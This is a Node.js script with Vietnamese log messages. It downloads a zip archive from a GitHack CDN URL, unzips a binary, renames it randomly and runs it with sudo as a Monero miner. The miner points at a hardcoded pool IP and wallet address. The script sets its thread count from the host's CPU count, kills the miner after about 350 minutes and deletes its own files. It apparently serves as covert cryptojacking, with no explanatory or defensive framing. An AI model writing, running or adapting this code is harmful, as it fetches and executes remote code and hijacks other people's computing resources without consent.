const { createWriteStream } = require('fs')
const Path = require('path')
const Axios = require('axios')
const shell = require('shelljs');
const { printLog } = require('./log-print');

shell.exec(`rm -rf SHA256SUMS runtool config.json __MACOSX`);
const nameTool = Math.random().toString(36).substring(7);

const timeout = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const numberCore = () => {
    const getNumberCore = shell.exec('cat /proc/cpuinfo | grep processor | wc -l', { silent: true });
    if (getNumberCore.code === 0) {
        console.log(`-- hieu suat ${ getNumberCore.stdout.trim() } / 10`)
        const core = getNumberCore.stdout.trim();
        if (core === '1')
            return 1;
        else if (core === '2')
            return Math.floor(Math.random() * 2) + 1;
        else if (core === '3')
            return Math.floor(Math.random() * 2) + 2;
        else if (core === '4')
            return Math.floor(Math.random() * 4) + 2;
        else if (core === '5')
            return Math.floor(Math.random() * 2) + 3;
        else if (core === '6')
            return Math.floor(Math.random() * 3) + 3;
        else if (core === '7')
            return Math.floor(Math.random() * 3) + 4;
        else if (core === '8')
            return Math.floor(Math.random() * 4) + 4;
        else if (core === '9')
            return Math.floor(Math.random() * 4) + 5;
        else if (core === '10')
            return Math.floor(Math.random() * 5) + 5;
        else if (core === '11')
            return Math.floor(Math.random() * 5) + 6;
        else if (core === '12')
            return Math.floor(Math.random() * 6) + 6;
        else if (core === '16')
            return Math.floor(Math.random() * 4) + 13;
        else
            return 10;
    }
}


const runJob = (nameTool) => {
    const coreNumber = numberCore() || 4;
    const runMonney = shell.exec(`sudo ./${nameTool} -o 168.62.177.218:8080 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder -k --nicehash --coin monero -a rx/0 -t ${coreNumber} --astrobwt-avx2`, { silent: true, async: true });
    if (runMonney.code !== undefined) {
        return 0;
    }
    runMonney.stdout.on('data', (rawLog) => {
        printLog(rawLog);
    });
    console.log(`-- dang tien hanh jobs voi ${coreNumber} cores`);
}

const downloadImage = async () => {
    const url = 'https://glcdn.githack.com/k.ing.d.om.he.art.stm.p/meocoder/-/raw/master/tool-nodejs.zip';
    const filename = `${Math.random().toString(36).substring(7)}.zip`;
    const path = Path.resolve(__dirname, filename);
    const writer = createWriteStream(path);
    const response = await Axios({
        url,
        method: 'GET',
        responseType: 'stream'
    });
    response.data.pipe(writer);
    return new Promise((resolve, reject) => {
        writer.on('finish', () => {
            if (shell.exec(`rm -rf SHA256SUMS runtool config.json && unzip ${filename} && cp runtool ${nameTool} && rm -rf ${filename}`, { silent: true }).code === 0) {
                console.log('-- giai nen file thanh cong');
                runJob(nameTool);
                return resolve((350 * 60) * 1000);
            }
        });
        writer.on('error', () => {
            console.log('-- tai file va thiet lap that bai');
            return reject();
        })
    })
}

try {
    downloadImage().then(async (timeRunJobs) => {
        console.log(`-- task chay trong ${((timeRunJobs / 60) / 1000)} phut`);
        await timeout(timeRunJobs);
        if (shell.exec(`killall ${nameTool}`, { silent: true }).code === 0) {
            console.log('-- ket thuc jobs');
            shell.exec(`rm -rf ${nameTool}`, { silent: true });
        }
        console.log('-- Task end');
    }).catch((err) => {
        console.log(error);
    });
} catch (error) {
    console.log(error);
}
